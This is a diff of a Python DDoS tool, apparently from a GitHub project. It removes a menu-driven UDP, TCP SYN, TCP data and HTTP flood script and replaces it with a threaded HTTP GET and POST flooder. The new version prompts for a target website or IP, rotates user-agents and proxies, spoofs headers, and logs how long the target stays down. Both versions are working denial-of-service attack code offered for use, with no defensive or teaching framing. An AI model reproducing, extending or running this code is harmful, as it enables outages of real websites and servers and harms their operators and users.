@@ -1,230 +1,168 @@
-import socket
-import random
-import time
-import threading
 import requests
-from colorama import init, Fore
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import urlparse
+from typing import List, Dict, Optional
+from fake_useragent import UserAgent
+import time
+import ctypes
+import logging
+import random
+import string
 
-# Initialize Colorama for colored output
-init(autoreset=True)
+# Set up logging configuration
+log_file = "ddos_attack.log"
+logging.basicConfig(filename=log_file, level=logging.INFO,
+                    format='%(asctime)s [%(levelname)s]: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
 
-# Set the window title
-print(f"\033]0;Python DDOS V1.0 ", end="", flush=True)
+def set_console_title(title: str):
+    ctypes.windll.kernel32.SetConsoleTitleW(title)
 
-# UDP Flood Methods
-def udp_plain_flood(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    end_time = time.time() + duration
-    packet_count = 0
-    payload = b"A" * packet_size  # Fixed payload
+def print_intro():
+    logo = """
+    ____  ____             __              __
+   / __ \/ __ \____  _____/ /_____  ____  / /
+  / / / / / / / __ \/ ___/ __/ __ \/ __ \/ / 
+ / /_/ / /_/ / /_/ (__  ) /_/ /_/ / /_/ / /  
+/_____/_____/\____/____/\__/\____/\____/_/
+github.com/wiced1
+"""
+    print(logo)
 
-    print(Fore.LIGHTBLUE_EX + f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
+def generate_random_string(length: int) -> str:
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+def send_request(session: requests.Session, url: str, proxies: Optional[Dict[str, str]] = None) -> bool:
     try:
-        while time.time() < end_time:
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
-    except Exception as e:
-        print(Fore.LIGHTRED_EX + f"[!] Error during UDP Plain flood: {e}")
-    finally:
-        sock.close()
-        print(Fore.LIGHTGREEN_EX + f"[+] UDP Plain flood complete! Sent {packet_count} packets.")
+        response = session.get(url, timeout=5, proxies=proxies)
+        return response.status_code == 200
+    except requests.exceptions.RequestException:
+        return False
 
-def udp_random_flood(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    end_time = time.time() + duration
-    packet_count = 0
+def analyze_responses(responses: List[requests.Response]):
+    status_codes = [response.status_code for response in responses]
+    unique_status_codes = set(status_codes)
+    status_code_counts = {code: status_codes.count(code) for code in unique_status_codes}
 
-    print(Fore.LIGHTBLUE_EX + f"[*] Starting UDP Random flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
-    try:
-        while time.time() < end_time:
-            payload = random.randbytes(packet_size)  # Random payload
-            sock.sendto(payload, (ip, port))
-            packet_count += 1
-    except Exception as e:
-        print(Fore.LIGHTRED_EX + f"[!] Error during UDP Random flood: {e}")
-    finally:
-        sock.close()
-        print(Fore.LIGHTGREEN_EX + f"[+] UDP Random flood complete! Sent {packet_count} packets.")
+    print("--- Response Analysis ---")
+    for code, count in status_code_counts.items():
+        print(f"Status Code {code}: {count} occurrence(s)")
 
-# TCP Flood Methods
-def tcp_syn_flood_single(ip, port, duration):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-    end_time = time.time() + duration
-    packet_count = 0
+def convert_to_seconds(hours: int, minutes: int, seconds: int) -> int:
+    return hours * 3600 + minutes * 60 + seconds
 
-    print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP SYN flood (Single) on {ip}:{port} for {duration} seconds...")
-    try:
-        while time.time() < end_time:
-            sock.connect_ex((ip, port))  # SYN flood doesn't complete handshake
-            packet_count += 1
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # New socket each time
-    except Exception as e:
-        print(Fore.LIGHTRED_EX + f"[!] Error during TCP SYN flood (Single): {e}")
-    finally:
-        sock.close()
-        print(Fore.LIGHTGREEN_EX + f"[+] TCP SYN flood (Single) complete! Sent {packet_count} SYN packets.")
+def send_requests_with_duration(url: str, num_requests: int, duration_hours: int, duration_minutes: int, duration_seconds: int, proxies: Optional[Dict[str, str]] = None, max_concurrency: int = 100) -> List[bool]:
+    domain = urlparse(url).hostname
+    results = []
+    responses = []
+    ua = UserAgent()
+    
+    with requests.Session() as session:
+        downtime_start = None
+        downtime_end = None
+        duration_seconds_total = convert_to_seconds(duration_hours, duration_minutes, duration_seconds)
+        start_time = time.time()
+        
+        while time.time() - start_time < duration_seconds_total:
+            with ThreadPoolExecutor(max_workers=min(num_requests, max_concurrency)) as executor:
+                futures = [executor.submit(send_request, session, url, proxies=proxies) for _ in range(num_requests)]
+                
+                for future in as_completed(futures):
+                    result = future.result()
+                    response = session.get(url, proxies=proxies)
+                    results.append(result)
+                    responses.append(response)
 
-def tcp_syn_flood_multi(ip, port, duration):
-    end_time = time.time() + duration
-    packet_count = [0]  # List to share count across threads
+                    if not result:
+                        if downtime_start is None:
+                            downtime_start = time.time()
+                    else:
+                        if downtime_start is not None:
+                            downtime_end = time.time()
+                            downtime_duration = downtime_end - downtime_start
 
-    def syn_worker():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        while time.time() < end_time:
-            try:
-                sock.connect_ex((ip, port))
-                packet_count[0] += 1
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            except:
-                pass
-        sock.close()
+                            # Log downtime information
+                            log_data = {
+                                "identifier": generate_random_string(8),
+                                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+                                "url": url,
+                                "status": "offline",
+                                "downtime_duration": downtime_duration
+                            }
+                            logging.warning(f"{log_data}")
 
-    print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP SYN flood (Multi-threaded) on {ip}:{port} for {duration} seconds...")
-    threads = [threading.Thread(target=syn_worker) for _ in range(10)]  # 10 threads
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join()
-    print(Fore.LIGHTGREEN_EX + f"[+] TCP SYN flood (Multi-threaded) complete! Sent {packet_count[0]} SYN packets.")
+                            downtime_start = None
 
-def tcp_data_flood_single(ip, port, duration, packet_size):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    end_time = time.time() + duration
-    packet_count = 0
-    payload = random.randbytes(packet_size)
+                    # Rotate user-agent and proxy for the next request
+                    session.headers['User-Agent'] = ua.random
+                    if proxies:
+                        proxies = {
+                            'http': f'http://{generate_random_string(16)}.com',
+                            'https': f'https://{generate_random_string(16)}.com'
+                        }
+                        session.proxies = proxies
 
-    print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP Data flood (Single) on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
-    try:
-        sock.connect((ip, port))
-        while time.time() < end_time:
-            sock.send(payload)
-            packet_count += 1
-    except Exception as e:
-        print(Fore.LIGHTRED_EX + f"[!] Error during TCP Data flood (Single): {e}")
-    finally:
-        sock.close()
-        print(Fore.LIGHTGREEN_EX + f"[+] TCP Data flood (Single) complete! Sent {packet_count} packets.")
+                    # Spoof various headers
+                    session.headers['Accept-Language'] = generate_random_string(5)
 
-def tcp_data_flood_multi(ip, port, duration, packet_size):
-    end_time = time.time() + duration
-    packet_count = [0]
+                    # Introduce variability in request payload
+                    payload = generate_random_string(10)
+                    session.post(url, data={'payload': payload}, proxies=proxies)
 
-    def data_worker():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        payload = random.randbytes(packet_size)
-        try:
-            sock.connect((ip, port))
-            while time.time() < end_time:
-                sock.send(payload)
-                packet_count[0] += 1
-        except:
-            pass
-        sock.close()
+                    # Manage sessions, handle cookies, and maintain session persistence
+                    session.cookies.update(response.cookies)
 
-    print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP Data flood (Multi-threaded) on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
-    threads = [threading.Thread(target=data_worker) for _ in range(10)]  # 10 threads
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join()
-    print(Fore.LIGHTGREEN_EX + f"[+] TCP Data flood (Multi-threaded) complete! Sent {packet_count[0]} packets.")
+                    # Simulate intelligent rate limiting
+                    time.sleep(random.uniform(0.5, 2.0))
 
-# HTTP Flood Method
-def http_flood(url, duration):
-    end_time = time.time() + duration
-    request_count = 0
+        for i, result in enumerate(results):
+            status_msg = "Website is down" if not result else ""
+            print(f"Request {i + 1} sent with result: {result} ({status_msg})")
 
-    print(Fore.LIGHTBLUE_EX + f"[*] Starting HTTP flood on {url} for {duration} seconds...")
-    try:
-        while time.time() < end_time:
-            requests.get(url, timeout=1)
-            request_count += 1
-    except Exception as e:
-        print(Fore.LIGHTRED_EX + f"[!] Error during HTTP flood: {e}")
-    print(Fore.LIGHTGREEN_EX + f"[+] HTTP flood complete! Sent {request_count} requests.")
-
-# Validation Function
-def validate_input(prompt, min_val, max_val, input_type=int):
-    while True:
-        try:
-            value = input_type(input(Fore.LIGHTBLUE_EX + prompt))
-            if min_val <= value <= max_val:
-                return value
-            print(Fore.LIGHTRED_EX + f"[!] Value must be between {min_val} and {max_val}.")
-        except ValueError:
-            print(Fore.LIGHTRED_EX + "[!] Invalid input. Please enter a number.")
+    analyze_responses(responses)
+    return results
 
 def main():
-    # Print header when tool runs
-    print(Fore.LIGHTGREEN_EX + "XX")
-    print(Fore.LIGHTBLUE_EX + "=== Network Flood Tool ===")
-    print("Protocols:")
-    print("1. UDP")
-    print("2. TCP")
-    print("3. HTTP")
+    set_console_title("DDoS Attack Tool")
+    print_intro()
+
+    target_type = input("Do you want to target a website or an IP address? (website/ip): ")
     
-    protocol = input(Fore.LIGHTBLUE_EX + "Select protocol (1-3): ").strip()
-
-    if protocol == "1":  # UDP
-        print(Fore.LIGHTBLUE_EX + "\nUDP Methods:")
-        print("1. UDP Plain (Fixed payload)")
-        print("2. UDP Random (Random payload)")
-        method = input(Fore.LIGHTBLUE_EX + "Select method (1-2): ").strip()
-
-        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
-        port = validate_input("Enter port (1-65535): ", 1, 65535)
-        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
-        packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)
-
-        if method == "1":
-            udp_plain_flood(ip, port, duration, packet_size)
-        elif method == "2":
-            udp_random_flood(ip, port, duration, packet_size)
-        else:
-            print(Fore.LIGHTRED_EX + "[!] Invalid UDP method.")
-
-    elif protocol == "2":  # TCP
-        print(Fore.LIGHTBLUE_EX + "\nTCP Methods:")
-        print("1. TCP SYN Flood (Sends SYN packets)")
-        print("2. TCP Data Flood (Sends data after connection)")
-        method = input(Fore.LIGHTBLUE_EX + "Select method (1-2): ").strip()
-
-        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
-        port = validate_input("Enter port (1-65535): ", 1, 65535)
-        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
-
-        print(Fore.LIGHTBLUE_EX + "Execution Style:")
-        print("1. Single (One socket)")
-        print("2. Multi-threaded (10 threads)")
-        style = input(Fore.LIGHTBLUE_EX + "Select style (1-2): ").strip()
-
-        if method == "1":
-            if style == "1":
-                tcp_syn_flood_single(ip, port, duration)
-            elif style == "2":
-                tcp_syn_flood_multi(ip, port, duration)
-            else:
-                print(Fore.LIGHTRED_EX + "[!] Invalid TCP SYN style.")
-        elif method == "2":
-            packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)
-            if style == "1":
-                tcp_data_flood_single(ip, port, duration, packet_size)
-            elif style == "2":
-                tcp_data_flood_multi(ip, port, duration, packet_size)
-            else:
-                print(Fore.LIGHTRED_EX + "[!] Invalid TCP Data style.")
-        else:
-            print(Fore.LIGHTRED_EX + "[!] Invalid TCP method.")
-
-    elif protocol == "3":  # HTTP
-        url = input(Fore.LIGHTBLUE_EX + "Enter URL (e.g., http://example.com): ")
-        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
-        http_flood(url, duration)
-
+    if target_type.lower() == "website":
+        url = input("Enter the target URL to attack: ")
+    elif target_type.lower() == "ip":
+        ip = input("Enter the target IP address to attack: ")
+        url = f"http://{ip}"
     else:
-        print(Fore.LIGHTRED_EX + "[!] Invalid protocol selected.")
+        print("Invalid target type. Please run the program again.")
+        return
+
+    try:
+        num_requests = int(input("Enter the number of requests to send: "))
+        duration_hours = int(input("Enter the duration in hours: "))
+        duration_minutes = int(input("Enter the duration in minutes: "))
+        duration_seconds = int(input("Enter the duration in seconds: "))
+    except ValueError:
+        print("Invalid input. Please enter integer values for the number of requests and duration.")
+        return
+
+    use_proxy = input("Do you want to use proxies? (y/n): ")
+    
+    if use_proxy.lower() == "y":
+        proxy_type = input("Enter the proxy type (http/https): ")
+        proxy_host = input("Enter the proxy host: ")
+        proxy_port = input("Enter the proxy port: ")
+        proxies = {proxy_type: f"{proxy_type}://{proxy_host}:{proxy_port}"}
+    else:
+        proxies = None
+
+    print("\n--- Initiating Attack ---")
+    results = send_requests_with_duration(url, num_requests, duration_hours, duration_minutes, duration_seconds, proxies=proxies, max_concurrency=100)
+    successes = results.count(True)
+    success_rate = successes / num_requests
+
+    print("\n--- Attack Complete ---")
+    print(f"Attack Success Rate: {success_rate:.2%}")
 
 if __name__ == "__main__":
     main()
